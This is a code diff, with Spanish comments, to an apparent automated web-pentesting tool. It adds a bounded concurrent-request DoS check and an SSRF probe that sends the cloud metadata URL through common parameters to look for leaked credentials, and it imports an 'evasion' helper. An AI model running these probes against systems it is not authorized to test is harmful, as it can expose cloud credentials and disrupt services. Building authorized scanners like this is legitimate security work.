@@ -4,6 +4,7 @@
  * una SPA responde 200 a todo y eso no es un hallazgo.
  */
 import { createHmac } from 'node:crypto';
+import { pool } from '../../core/evasion.ts';
 import { decodeJwt, reqLine, type RecordedResponse } from '../../core/http.ts';
 import type { Attack, AttackContext, AttackResult, AttackStep } from '../../core/types.ts';
 import { CATALOG } from './catalog.ts';
@@ -586,6 +587,63 @@ export function buildAttacks(state: GenericState): Attack[] {
     },
   };
 
-  const attacks: Attack[] = [exposedFiles, sqlInjection, jwtForgery, massAssignment, adminNoAuthz, unauthData, idor, cors, bruteForce, userEnum, verboseErrors];
+  // ----- clases DESTRUCTIVAS (solo corren con --destructive; diagnose las filtra si no) -----
+  // Derivan los endpoints del RepoModel, así generalizan a cualquier app.
+  const livePath = (pred: (m: string) => boolean = (m) => m === 'GET'): string => {
+    const r = (state.input.repo?.routes ?? []).find((x) => pred(x.method));
+    return (r?.path ?? '/').replace(/:(\w+)|\{(\w+)\}|<(\w+)>/g, '1');
+  };
+
+  const dos: Attack = {
+    meta: CATALOG['dos'],
+    mutating: false,
+    destructive: true,
+    async run(ctx: AttackContext): Promise<AttackResult> {
+      const r = base('dos');
+      const path = livePath();
+      const N = 24, C = 12;
+      const t0 = ctx.clock.now();
+      const statuses = await pool(Array.from({ length: N }, (_, i) => i), C, async () => (await ctx.http.get(path)).status);
+      const elapsed = ctx.clock.now() - t0;
+      const blocked = statuses.filter((s) => s === 429 || s === 503).length;
+      const ok = statuses.filter((s) => s < 400).length;
+      const confirmed = blocked === 0 && ok > 0;
+      r.steps.push(step('Ráfaga acotada de peticiones concurrentes', ['T1499'], null, `${ok}/${N} OK, ${blocked} limitadas (429/503), ${elapsed}ms`, confirmed ? 'Sin rate limit ni backpressure: el endpoint es amplificable.' : undefined));
+      return { ...r, confirmed, gained: confirmed ? [`${path} sin protección de tasa (amplificable)`] : [],
+        summary: confirmed ? `DoS: ${N} peticiones concurrentes a ${path} sin una sola respuesta de rate limit.` : `El endpoint aplicó límite (${blocked} respuestas 429/503).` };
+    },
+  };
+
+  const SSRF_PARAMS = ['url', 'uri', 'link', 'fetch', 'image', 'img', 'callback', 'webhook', 'target', 'dest', 'host', 'next'];
+  const SSRF_INTERNAL = 'http://169.254.169.254/latest/meta-data/';
+  const SSRF_LEAK = /secret|aws_|token|credential|meta-data|private[_-]?key/i;
+
+  const ssrfSecrets: Attack = {
+    meta: CATALOG['ssrf-secrets'],
+    mutating: false,
+    destructive: true,
+    async run(ctx: AttackContext): Promise<AttackResult> {
+      const r = base('ssrf-secrets');
+      const routes = (state.input.repo?.routes ?? []).filter((x) => x.method === 'GET' || x.method === 'POST');
+      for (const rt of routes) {
+        const p = rt.path.replace(/:(\w+)|\{(\w+)\}|<(\w+)>/g, '1');
+        for (const param of SSRF_PARAMS) {
+          const res = rt.method === 'GET'
+            ? await ctx.http.get(`${p}?${param}=${encodeURIComponent(SSRF_INTERNAL)}`)
+            : await ctx.http.request({ method: 'POST', path: p, body: { [param]: SSRF_INTERNAL } });
+          if (res.status < 400 && SSRF_LEAK.test(res.text)) {
+            if (rt.ref) state.refs.set('ssrf-secrets', rt.ref);
+            r.steps.push(step('SSRF al metadata endpoint del cloud', ['T1552.005'], res, `HTTP ${res.status} — el servidor devolvió credenciales internas`, 'Con estas credenciales el atacante pivota a otros servicios.'));
+            return { ...r, confirmed: true, gained: ['credenciales del metadata endpoint (SSRF)', 'potencial de movimiento lateral'],
+              foothold: { type: 'db', detail: 'credenciales de servicio vía SSRF' }, attacker_active: true,
+              summary: `SSRF confirmado: ${rt.method} ${rt.path} (param ${param}) filtró credenciales del metadata endpoint.` };
+          }
+        }
+      }
+      return { ...r, confirmed: false, summary: 'Ningún endpoint hizo fetch de un destino interno (o no existe): sin SSRF.' };
+    },
+  };
+
+  const attacks: Attack[] = [exposedFiles, sqlInjection, jwtForgery, massAssignment, adminNoAuthz, unauthData, idor, cors, bruteForce, userEnum, verboseErrors, dos, ssrfSecrets];
   return attacks;
 }
